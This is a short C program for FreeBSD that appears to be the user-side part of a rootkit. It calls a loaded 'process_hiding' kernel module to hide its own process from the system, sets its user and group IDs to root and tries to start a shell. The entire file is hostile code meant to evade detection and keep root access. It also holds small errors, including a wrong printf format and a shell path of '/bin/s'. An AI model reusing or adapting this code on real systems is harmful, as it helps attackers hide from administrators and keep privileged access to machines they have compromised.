
//  Create a module to elevate privileges and spawn a bash shell
// Make sure to hide myself.

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/module.h>
#include <sys/types.h>
// #include <sys/sysproto.h>


int
main(int argc, char *argv[]){
  int syscall_num;
  struct module_stat stat;

  stat.version = sizeof(stat);
  modstat(modfind("sys/process_hiding"), &stat);
  syscall_num = stat.data.intval;

  //pass in the syscall for process_hiding and the pid for itself
  printf("Hiding self (%s)..\n", getpid());

  syscall(syscall_num, getpid()); //hide self

  printf("Spawning shell..\n");

  //elevation
  setgid(0);
  setuid(0);

  //spawn shell
  //https://www.freebsd.org/cgi/man.cgi?query=exec&sektion=3&manpath=freebsd-release-ports
  execl("/bin/s", "sh", 0);
  return 0;
}
